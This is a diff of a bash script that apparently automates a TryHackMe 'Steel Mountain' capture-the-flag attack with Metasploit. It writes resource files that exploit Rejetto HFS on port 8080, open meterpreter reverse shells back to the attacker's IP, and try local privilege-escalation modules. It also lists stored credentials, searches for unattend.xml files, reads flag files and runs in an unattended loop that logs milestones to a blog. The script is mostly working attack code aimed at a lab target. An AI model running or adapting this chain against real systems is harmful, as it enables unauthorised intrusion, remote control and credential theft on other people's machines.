@@ -6,16 +6,15 @@ BLOG="/home/kali/Redteam-Hermes/docs/walkthroughs/THM/steel-mountain-live.md"
 LOGDIR="/home/kali/Redteam-Hermes/logs"
 LOG="$LOGDIR/steel_mountain_worker.log"
 STATE_DIR="$LOGDIR/steel_state"
-STUCK_FILE="$STATE_DIR/stuck_cycles"
 mkdir -p "$LOGDIR" "$STATE_DIR"
 
 TS() { date -u +"%Y-%m-%d %H:%M:%SZ"; }
 log() { echo "[$(TS)] $*" | tee -a "$LOG"; }
-blog_append() {
+blog_milestone() {
+  local title="$1"; shift
   {
     echo
-    echo "### $(TS) — $1"
-    shift
+    echo "### $(TS) — $title"
     for l in "$@"; do echo "$l"; done
   } >> "$BLOG"
 }
@@ -34,140 +33,114 @@ single_tunnel_ok() {
   [[ "$c" -eq 1 ]]
 }
 
-next_method() {
-  local n=0
-  [[ -f "$STUCK_FILE" ]] && n=$(cat "$STUCK_FILE" 2>/dev/null || echo 0)
-  n=$((n+1))
-  echo "$n" > "$STUCK_FILE"
-  echo $((n % 4))
+build_foothold_rc() {
+  local lhost="$1" runlog="$2"
+  cat > /tmp/steel_foothold.rc <<EOF
+spool $runlog
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS $TARGET
+set RPORT 8080
+set payload windows/meterpreter/reverse_tcp
+set LHOST $lhost
+set LPORT 4444
+run -j
+sleep 15
+sessions -l
+spool off
+exit -y
+EOF
 }
 
-reset_stuck() { echo 0 > "$STUCK_FILE"; }
-
-session_cmds() {
-  local sid="$1"
-  local mode="$2"
-
-  cat <<EOF
-sessions -i $sid -C "getuid" --timeout 45
-sessions -i $sid -C "sysinfo" --timeout 45
-sessions -i $sid -C "shell -c whoami" --timeout 45
-sessions -i $sid -C "shell -c whoami /priv" --timeout 45
-EOF
-
-  case "$mode" in
-    0)
-      cat <<EOF
-sessions -i $sid -C "getsystem" --timeout 60
-sessions -i $sid -C "load incognito" --timeout 45
-sessions -i $sid -C "list_tokens -u" --timeout 45
-EOF
-      ;;
-    1)
-      cat <<EOF
-sessions -i $sid -C "run post/multi/recon/local_exploit_suggester" --timeout 120
-sessions -i $sid -C "run post/windows/gather/enum_system" --timeout 120
-EOF
-      ;;
-    2)
-      cat <<EOF
-sessions -i $sid -C "shell -c sc query state^= all" --timeout 80
-sessions -i $sid -C "shell -c schtasks /query /fo LIST /v" --timeout 90
-EOF
-      ;;
-    3)
-      cat <<EOF
-sessions -i $sid -C "shell -c cmdkey /list" --timeout 60
-sessions -i $sid -C "shell -c dir C:\\ /b /s *unattend*.xml" --timeout 90
-sessions -i $sid -C "shell -c type C:\\Users\\bill\\Desktop\\user.txt" --timeout 45
-EOF
-      ;;
-  esac
+extract_session_ids() {
+  local runlog="$1"
+  awk '/meterpreter x86\/windows/ {print $1}' "$runlog" | sed 's/[^0-9]//g' | grep -E '^[0-9]+$' | sort -n | uniq
 }
 
-build_rc() {
-  local lhost="$1" lport="$2" payload="$3" runlog="$4" mode="$5"
+build_privesc_rc() {
+  local runlog="$1" lhost="$2"; shift 2
+  local sids=("$@")
   {
     echo "spool $runlog"
-    echo "use exploit/windows/http/rejetto_hfs_exec"
-    echo "set RHOSTS $TARGET"
-    echo "set RPORT 8080"
-    echo "set LHOST $lhost"
-    echo "set LPORT $lport"
-    echo "set payload $payload"
-    echo "run -j"
-    echo "sleep 18"
     echo "sessions -l"
-    for sid in 1 2 3 4 5 6 7 8; do
-      session_cmds "$sid" "$mode"
+    for sid in "${sids[@]}"; do
+      echo "sessions -i $sid -C \"getuid\" --timeout 45"
+      echo "sessions -i $sid -C \"sysinfo\" --timeout 45"
+      echo "sessions -i $sid -C \"shell -c type C:\\\\Users\\\\bill\\\\Desktop\\\\user.txt\" --timeout 45"
+      echo "sessions -i $sid -C \"getsystem\" --timeout 60"
+      echo "sessions -i $sid -C \"run post/multi/recon/local_exploit_suggester\" --timeout 120"
+      echo "sessions -i $sid -C \"run post/windows/gather/enum_services\" --timeout 120"
+      echo "sessions -i $sid -C \"shell -c whoami /priv\" --timeout 45"
+      echo "sessions -i $sid -C \"shell -c sc qc AdvancedSystemCareService9\" --timeout 60"
+      echo "sessions -i $sid -C \"shell -c wmic service get name,displayname,pathname,startmode | findstr /i /v \\\"C:\\\\\\\\Windows\\\\\\\\\\\" | findstr /i /v \\\"\\\\\\\"\\\"\" --timeout 90"
+      echo "sessions -i $sid -C \"shell -c cmdkey /list\" --timeout 60"
+      echo "sessions -i $sid -C \"shell -c dir C:\\\\ /b /s *unattend*.xml\" --timeout 90"
+      echo "sessions -i $sid -C \"shell -c type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\" --timeout 45"
     done
+
+    for sid in "${sids[@]}"; do
+      echo "use exploit/windows/local/service_permissions"
+      echo "set SESSION $sid"
+      echo "set LHOST $lhost"
+      echo "set LPORT 5555"
+      echo "set PAYLOAD windows/meterpreter/reverse_tcp"
+      echo "run"
+
+      echo "use exploit/windows/local/unquoted_service_path"
+      echo "set SESSION $sid"
+      echo "set LHOST $lhost"
+      echo "set LPORT 6666"
+      echo "set PAYLOAD windows/meterpreter/reverse_tcp"
+      echo "run"
+    done
+
     echo "sessions -l"
+    for sid in 1 2 3 4 5 6 7 8 9 10; do
+      echo "sessions -i $sid -C \"getuid\" --timeout 45"
+      echo "sessions -i $sid -C \"shell -c type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\" --timeout 45"
+    done
     echo "spool off"
     echo "exit -y"
-  } > /tmp/steel_mountain_hfs.rc
+  } > /tmp/steel_privesc.rc
 }
 
-attempt_once() {
-  local lhost="$1" lport="$2" payload="$3" mode="$4"
-  local runlog="$STATE_DIR/msf_${lport}_$(date +%s).log"
-
-  build_rc "$lhost" "$lport" "$payload" "$runlog" "$mode"
-  msfconsole -q -r /tmp/steel_mountain_hfs.rc >> "$LOG" 2>&1 || true
-
-  grep -Eqi "(NT AUTHORITY\\SYSTEM|getsystem:.*success|got system|is_system:\s*true)" "$runlog" && {
-    log "privesc success: SYSTEM observed ($runlog)"
-    touch "$STATE_DIR/system_observed"
-    reset_stuck
-    blog_append "Privilege escalation milestone" \
-      "- SYSTEM-level context observed during automated methodology cycle." \
-      "- Evidence log: $runlog"
-    return 0
-  }
-
-  if grep -Eqi "Meterpreter session [0-9]+ opened|Command shell session [0-9]+ opened" "$runlog"; then
-    log "foothold obtained; no SYSTEM yet (method=$mode, payload=$payload, lport=$lport)"
-    return 0
-  fi
-
-  return 1
-}
-
-log "worker supervisor start (methodology-driven foothold+privesc)"
+log "worker start (autonomous foothold->privesc finisher mode)"
 
 while true; do
-  if ! single_tunnel_ok; then log "blocked: tunnel count != 1; waiting"; sleep 30; continue; fi
-
+  if ! single_tunnel_ok; then log "hold: need exactly one active tunnel"; sleep 30; continue; fi
   ATTACKER_IP=$(get_attacker_ip)
-  if [[ -z "$ATTACKER_IP" ]]; then log "blocked: no tun interface IP; retry in 45s"; sleep 45; continue; fi
-  if ! target_up; then log "target 8080 not reachable; retry in 45s"; sleep 45; continue; fi
+  if [[ -z "$ATTACKER_IP" ]]; then log "hold: missing tun IP"; sleep 30; continue; fi
+  if ! target_up; then log "hold: target 8080 not reachable"; sleep 45; continue; fi
 
-  mode=$(next_method)
-  case "$mode" in
-    0) log "method pivot: token/SYSTEM path (Windows methodology phase 4)" ;;
-    1) log "method pivot: exploit-suggester + system enum path" ;;
-    2) log "method pivot: services/tasks misconfig path" ;;
-    3) log "method pivot: credentials/secrets path" ;;
-  esac
+  stamp=$(date +%s)
+  foothold_log="$STATE_DIR/foothold_${stamp}.log"
+  privesc_log="$STATE_DIR/privesc_${stamp}.log"
 
-  log "starting attempt cycle from $ATTACKER_IP"
-  nmap -Pn -n -p8080 -sV "$TARGET" >> "$LOG" 2>&1 || true
+  build_foothold_rc "$ATTACKER_IP" "$foothold_log"
+  msfconsole -q -r /tmp/steel_foothold.rc >> "$LOG" 2>&1 || true
 
-  success=0
-  for lport in 4444 5555 9001; do
-    for payload in windows/meterpreter/reverse_tcp windows/meterpreter/reverse_http windows/shell/reverse_tcp; do
-      if attempt_once "$ATTACKER_IP" "$lport" "$payload" "$mode"; then success=1; break 2; fi
-      sleep 3
-    done
-  done
-
-  if [[ -f "$STATE_DIR/system_observed" ]]; then
-    log "SYSTEM already observed; slowing loop"
-    sleep 180
-  elif [[ "$success" -eq 1 ]]; then
-    log "foothold present; continuing with next methodology branch"
-    sleep 70
-  else
-    log "no foothold this cycle; backoff 90s"
-    sleep 90
+  mapfile -t sids < <(extract_session_ids "$foothold_log")
+  if [[ ${#sids[@]} -eq 0 ]]; then
+    log "no active meterpreter sessions after foothold attempt"
+    sleep 40
+    continue
   fi
+
+  log "active sessions discovered: ${sids[*]}"
+  build_privesc_rc "$privesc_log" "$ATTACKER_IP" "${sids[@]}"
+  msfconsole -q -r /tmp/steel_privesc.rc >> "$LOG" 2>&1 || true
+
+  if grep -Eqi 'NT AUTHORITY\\SYSTEM|getsystem:.*success|is_system:\s*true' "$privesc_log"; then
+    log "SYSTEM observed"
+    blog_milestone "Privilege escalation milestone" \
+      "- SYSTEM-level context observed in autonomous finisher cycle." \
+      "- Evidence log: $privesc_log"
+  fi
+
+  if grep -Eqi 'type C:\\Users\\bill\\Desktop\\user.txt|type C:\\Users\\Administrator\\Desktop\\root.txt' "$privesc_log"; then
+    blog_milestone "Proof update" \
+      "- Automated proof command(s) executed against user/root flag paths." \
+      "- Evidence log: $privesc_log"
+  fi
+
+  sleep 50
 done
